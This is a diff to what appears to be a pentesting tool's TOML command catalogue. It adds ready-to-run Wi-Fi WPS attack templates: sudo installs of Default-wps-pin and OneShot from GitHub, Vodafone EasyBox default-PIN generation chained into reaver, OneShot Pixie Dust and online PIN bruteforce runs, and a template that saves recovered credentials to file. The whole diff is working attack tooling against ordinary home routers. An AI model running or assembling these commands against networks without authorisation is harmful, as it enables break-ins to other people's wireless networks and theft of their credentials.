@@ -12,6 +12,7 @@ order = 12
 #   evil_twin_psk=WrongPassword123  eap_tls_key_pass=whatever
 #   eap=PEAP  phase2=mschapv2  cert_dir=/tmp/certs
 #   oui=60-38-E0  oui_db=/var/lib/ieee-data/oui.txt  (optional; lookup tries common paths)
+#   wps_pin=1234  — OneShot -B first-half PIN; oneshot uses {iface} or {mon_iface}
 
 # === Host / interface enumeration ===
 
@@ -939,6 +940,107 @@ done; \\
 echo 'PIN guesses complete'"""
 requires = ["wpspin", "reaver"]
 tags = ["wps", "wpspin", "reaver", "chain"]
+interactive = true
+
+[[command]]
+id = "wifi.default_wps_pin.install"
+title = "Default-wps-pin — install Vodafone EasyBox algo (eye9poob)"
+template = """sudo rm -rf /opt/Default-wps-pin && \\
+sudo git clone --depth 1 https://github.com/eye9poob/Default-wps-pin.git /opt/Default-wps-pin && \\
+sudo chmod +x /opt/Default-wps-pin/default-wps-pin.py"""
+tags = ["wps", "easybox", "vodafone", "install"]
+
+[[command]]
+id = "wifi.default_wps_pin"
+title = "Default-wps-pin — Vodafone EasyBox WPS PIN from {bssid} (python2)"
+template = "python2 /opt/Default-wps-pin/default-wps-pin.py {bssid}"
+requires = ["python2"]
+tags = ["wps", "easybox", "vodafone", "offline"]
+
+[[command]]
+id = "wifi.default_wps_pin.reaver"
+title = "Default-wps-pin + reaver — EasyBox PIN then reaver -p"
+template = """PIN=$(python2 /opt/Default-wps-pin/default-wps-pin.py {bssid} 2>/dev/null | awk -F': ' '/WPS pin:/ {{print $2; exit}}') && \\
+test -n \"$PIN\" && sudo reaver -i {mon_iface} -b {bssid} -p \"$PIN\" -vv || \\
+echo 'No PIN from Default-wps-pin; run wifi.default_wps_pin.install'"""
+requires = ["python2", "reaver"]
+tags = ["wps", "easybox", "vodafone", "reaver"]
+
+[[command]]
+id = "wifi.oneshot.install"
+title = "OneShot — install to /opt/OneShot (fulvius31)"
+template = """echo 'Deps: python3, wpasupplicant, iw, pixiewps (Kali: apt install …)' && \\
+(sudo apt-get install -y python3 wpasupplicant iw pixiewps 2>/dev/null || \\
+ sudo apt install -y python3 wpasupplicant iw pixiewps 2>/dev/null || true) && \\
+sudo rm -rf /opt/OneShot && \\
+sudo git clone --depth 1 https://github.com/fulvius31/OneShot.git /opt/OneShot && \\
+sudo chmod +x /opt/OneShot/oneshot.py && \\
+test -f /opt/OneShot/vulnwsc.txt || \\
+sudo wget -q -O /opt/OneShot/vulnwsc.txt https://raw.githubusercontent.com/fulvius31/OneShot/master/vulnwsc.txt"""
+tags = ["wps", "oneshot", "install"]
+
+[[command]]
+id = "wifi.oneshot.pixie"
+title = "OneShot — Pixie Dust on {bssid} (monitor iface, airmon-ng OK)"
+template = "sudo python3 /opt/OneShot/oneshot.py -b {bssid} -i {mon_iface} -K"
+requires = ["python3", "pixiewps", "wpa_supplicant", "iw"]
+tags = ["wps", "oneshot", "pixie"]
+interactive = true
+
+[[command]]
+id = "wifi.oneshot.pixie.managed"
+title = "OneShot — Pixie Dust on {bssid} (managed {iface}, no monitor)"
+template = "sudo python3 /opt/OneShot/oneshot.py -b {bssid} -i {iface} -K --iface-down"
+requires = ["python3", "pixiewps", "wpa_supplicant", "iw"]
+tags = ["wps", "oneshot", "pixie"]
+interactive = true
+
+[[command]]
+id = "wifi.oneshot.scan"
+title = "OneShot — scan APs, pick target, Pixie Dust (-K)"
+template = "sudo python3 /opt/OneShot/oneshot.py -i {iface} -K"
+requires = ["python3", "pixiewps", "wpa_supplicant", "iw"]
+tags = ["wps", "oneshot", "pixie", "scan"]
+interactive = true
+
+[[command]]
+id = "wifi.oneshot.scan.mon"
+title = "OneShot — scan on {mon_iface}, Pixie Dust (-K)"
+template = "sudo python3 /opt/OneShot/oneshot.py -i {mon_iface} -K"
+requires = ["python3", "pixiewps", "wpa_supplicant", "iw"]
+tags = ["wps", "oneshot", "pixie", "scan"]
+interactive = true
+
+[[command]]
+id = "wifi.oneshot.bruteforce"
+title = "OneShot — online WPS bruteforce (-B)"
+template = "sudo python3 /opt/OneShot/oneshot.py -b {bssid} -i {iface} -B"
+requires = ["python3", "wpa_supplicant", "iw"]
+tags = ["wps", "oneshot", "bruteforce"]
+interactive = true
+
+[[command]]
+id = "wifi.oneshot.bruteforce.pin"
+title = "OneShot — bruteforce with first half PIN (-B -p)"
+template = "sudo python3 /opt/OneShot/oneshot.py -b {bssid} -i {iface} -B -p {wps_pin}"
+requires = ["python3", "wpa_supplicant", "iw"]
+tags = ["wps", "oneshot", "bruteforce"]
+interactive = true
+
+[[command]]
+id = "wifi.oneshot.pbc"
+title = "OneShot — WPS push-button connect (--pbc)"
+template = "sudo python3 /opt/OneShot/oneshot.py -i {iface} --pbc"
+requires = ["python3", "wpa_supplicant", "iw"]
+tags = ["wps", "oneshot", "pbc"]
+interactive = true
+
+[[command]]
+id = "wifi.oneshot.write"
+title = "OneShot — Pixie on {bssid}, save creds to file (-w)"
+template = "sudo python3 /opt/OneShot/oneshot.py -b {bssid} -i {iface} -K -w"
+requires = ["python3", "pixiewps", "wpa_supplicant", "iw"]
+tags = ["wps", "oneshot", "pixie"]
 interactive = true
 
 # === airolib-ng (precomputed PMK) ===
